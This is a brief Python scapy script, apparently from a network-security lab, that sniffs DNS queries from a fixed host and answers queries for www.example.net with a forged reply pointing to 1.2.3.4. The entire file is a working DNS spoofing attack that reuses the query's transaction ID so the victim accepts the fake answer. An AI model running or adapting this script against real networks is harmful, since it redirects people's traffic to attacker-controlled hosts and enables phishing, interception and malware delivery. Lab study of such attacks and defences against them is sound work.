#!/usr/bin/env python

from scapy.all import *
conf.L3socket=L3RawSocket

def spoof(pkt):
  if DNS in pkt and "www.example.net" in pkt[DNS].qd.qname:
    src_port = pkt[UDP].sport

    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
    
    ans_sec = DNSRR(rrname=pkt[DNS].qd.qname, type="A",
			rdata="1.2.3.4", ttl=259200)
    dns = DNS(id=pkt[DNS].id, 
        	qr=1, aa=0, rd=0, 
        	qdcount=1, ancount=1, 
        	qd=pkt[DNS].qd, an=ans_sec) 

    spoof_pkt = ip/udp/dns
    send(spoof_pkt)

if __name__ == "__main__":
  filter_str = "udp and src host 10.0.2.5 and dst port 53"
  sniff(filter=filter_str, prn=spoof)
